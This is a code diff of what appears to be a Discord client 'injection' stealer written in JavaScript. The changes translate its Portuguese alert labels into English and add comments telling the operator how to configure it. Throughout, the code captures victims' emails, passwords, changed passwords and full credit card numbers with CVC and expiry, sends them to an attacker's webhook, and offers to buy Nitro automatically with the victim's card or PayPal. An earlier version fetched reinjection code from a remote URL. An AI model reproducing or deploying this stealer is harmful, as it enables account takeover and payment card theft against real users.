@@ -7,15 +7,17 @@ const { BrowserWindow, session } = require('electron');
 
 const config = {
   webhook: '%WEBHOOK%',
-  webhook_protector_key: '%WEBHOOK_KEY%',
-  auto_buy_nitro: false,
-  ping_on_run: false,
-  ping_val: '@everyone',
-  embed_name: 'Dr4g0nSec | Injection V1', 
-  embed_icon: 'https://i.imgur.com/83uCFZe.jpeg', 
-  embed_color: 0x250e80,
-  injection_url: 'https://raw.githubusercontent.com/P180EwqDeRT/ae6f117592b71439e4f9a75c19da8cdd/refs/heads/main/f9a75c19da8cdd/ae6f117592b7.js', 
-
+  webhook_protector_key: '%WEBHOOK_KEY%', //your base32 encoded key IF you're using https://github.com/Rdimo/Discord-Webhook-Protector
+  auto_buy_nitro: false, //automatically buys nitro for you if they add credit card or paypal or tries to buy nitro themselves
+  ping_on_run: false, //sends whatever value you have in ping_val when you get a run/login
+  ping_val: '@everyone', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
+  embed_name: 'Dr4g0nSec | Injection', //name of the webhook thats gonna send the info
+  embed_icon: 'https://i.imgur.com/83uCFZe.jpeg', //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
+  embed_color: 0x250e80, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
+  injection_url: '', //injection url for when it reinjects
+  /**
+   * @ATTENTION DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING @ATTENTION
+   **/
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
     boost: {
@@ -658,13 +660,13 @@ const login = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Informações da conta**',
+            name: '**Account Info**',
             value: `Email: **${email}** - Password: **${password}**`,
             inline: false,
           },
           {
             name: '**Discord Info**',
-            value: `Tipo Nitro: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
             inline: false,
           },
           {
@@ -678,8 +680,7 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'Discord Injection by sk4rty | https://github.com/sk4rtyxz',
-          icon_url: 'https://i.imgur.com/83uCFZe.jpeg'
+          text: 'Discord Injection By sk4rty・https://github.com/sk4rtyxz',
         },
       },
     ],
@@ -701,13 +702,13 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Senha alterada**',
-            value: `Email: **${json.email}**\nSenha Antiga: **${oldpassword}**\nNova Senha: **${newpassword}**`,
+            name: '**Password Changed**',
+            value: `Email: **${json.email}**\nOld Password: **${oldpassword}**\nNew Password: **${newpassword}**`,
             inline: true,
           },
           {
             name: '**Discord Info**',
-            value: `Tipo Nitro: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
             inline: true,
           },
           {
@@ -721,8 +722,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'Discord Injection by sk4rty | https://github.com/sk4rtyxz',
-          icon_url: 'https://i.imgur.com/83uCFZe.jpeg'
+          text: 'Discord Injection By sk4rty・https://github.com/sk4rtyxz',
         },
       },
     ],
@@ -744,13 +744,13 @@ const emailChanged = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**E-mail alterado**',
-            value: `Novo e-mail: **${email}**\nPassword: **${password}**`,
+            name: '**Email Changed**',
+            value: `New Email: **${email}**\nPassword: **${password}**`,
             inline: true,
           },
           {
             name: '**Discord Info**',
-            value: `Tipo Nitro: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
             inline: true,
           },
           {
@@ -764,8 +764,7 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'Discord Injection by sk4rty | https://github.com/sk4rtyxz',
-          icon_url: 'https://i.imgur.com/83uCFZe.jpeg'
+          text: 'Discord Injection By sk4rty・https://github.com/sk4rtyxz',
         },
       },
     ],
@@ -787,13 +786,13 @@ const PaypalAdded = async (token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Paypal adicionado**',
-            value: `Hora de comprar nitro, manow`,
+            name: '**Paypal Added**',
+            value: `Time to buy some nitro baby 😩`,
             inline: false,
           },
           {
             name: '**Discord Info**',
-            value: `Tipo Nitro: **${nitro}*\nBadges: **${badges}**\nBilling: **${billing}**`,
+            value: `Nitro Type: **${nitro}*\nBadges: **${badges}**\nBilling: **${billing}**`,
             inline: false,
           },
           {
@@ -807,8 +806,7 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'Discord Injection by sk4rty | https://github.com/sk4rtyxz',
-          icon_url: 'https://i.imgur.com/83uCFZe.jpeg'
+          text: 'Discord Injection By sk4rty・https://github.com/sk4rtyxz',
         },
       },
     ],
@@ -830,13 +828,13 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Cartão de crédito adicionado**',
-            value: `Número do cartão de crédito: **${number}**\nCVC: **${cvc}**\nExpiração do cartão de crédito: **${expir_month}/${expir_year}**`,
+            name: '**Credit Card Added**',
+            value: `Credit Card Number: **${number}**\nCVC: **${cvc}**\nCredit Card Expiration: **${expir_month}/${expir_year}**`,
             inline: true,
           },
           {
             name: '**Discord Info**',
-            value: `Tipo Nitro: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
             inline: true,
           },
           {
@@ -850,8 +848,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'Discord Injection by sk4rty | https://github.com/sk4rtyxz',
-          icon_url: 'https://i.imgur.com/83uCFZe.jpeg'
+          text: 'Discord Injection By sk4rty・https://github.com/sk4rtyxz',
         },
       },
     ],
@@ -875,13 +872,13 @@ const nitroBought = async (token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Comprou Nitro!**',
+            name: '**Nitro bought!**',
             value: `**Nitro Code:**\n\`\`\`diff\n+ ${code}\`\`\``,
             inline: true,
           },
           {
             name: '**Discord Info**',
-            value: `Tipo Nitro: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
             inline: true,
           },
           {
@@ -895,8 +892,7 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'Discord Injection by sk4rty | https://github.com/sk4rtyxz',
-          icon_url: 'https://i.imgur.com/83uCFZe.jpeg'
+          text: 'Discord Injection By sk4rty・https://github.com/sk4rtyxz',
         },
       },
     ],
